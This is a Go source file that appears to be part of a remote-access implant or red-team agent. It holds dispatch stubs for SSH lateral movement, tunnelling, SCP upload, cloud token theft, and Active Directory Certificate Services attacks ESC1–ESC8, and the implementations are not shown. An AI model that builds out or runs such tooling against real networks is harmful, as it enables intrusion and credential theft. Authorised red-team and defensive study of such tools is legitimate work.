//go:build linux || windows || darwin

package main

import "runtime"

// SSH lateral movement handlers (cross-platform)
func handleSSHLateral(task Task, res *TaskResult) {
	handleSSHLateralImpl(task, res)
}

func handleSSHKeygen(task Task, res *TaskResult) {
	handleSSHKeygenImpl(task, res)
}

func handleSSHTunnel(task Task, res *TaskResult) {
	handleSSHTunnelImpl(task, res)
}

func handleSCPUpload(task Task, res *TaskResult) {
	handleSCPUploadImpl(task, res)
}

// Cloud token theft handlers
func handleCloudTokenTheft(task Task, res *TaskResult) {
	handleCloudTokenTheftImpl(task, res)
}

// ADCS Attack Suite handlers
func handleADCSESC1(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	handleADCSESC1Impl(task, res)
}

func handleADCSESC2(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	handleADCSESC2Impl(task, res)
}

func handleADCSESC3(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	handleADCSESC3Impl(task, res)
}

func handleADCSESC4(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	handleADCSESC4Impl(task, res)
}

func handleADCSESC5(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	handleADCSESC5Impl(task, res)
}

func handleADCSESC6(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	handleADCSESC6Impl(task, res)
}

func handleADCSESC7(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	handleADCSESC7Impl(task, res)
}

func handleADCSESC8(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	handleADCSESC8Impl(task, res)
}

func handleADCSFullAudit(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "Windows only"
		return
	}
	handleADCSFullAuditImpl(task, res)
}
